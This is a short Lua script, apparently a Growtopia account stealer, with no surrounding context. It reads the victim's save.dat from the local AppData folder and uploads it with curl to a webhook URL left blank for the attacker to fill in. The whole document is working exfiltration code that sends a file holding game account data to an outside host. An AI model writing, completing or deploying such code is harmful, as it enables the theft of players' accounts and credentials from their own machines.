webhook = ""

status_code = os.execute('curl -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" -F "file=@' .. os.getenv("USERPROFILE") .. "/AppData/Local/Growtopia/save.dat" .. '" -F "content=" ' .. webhook)
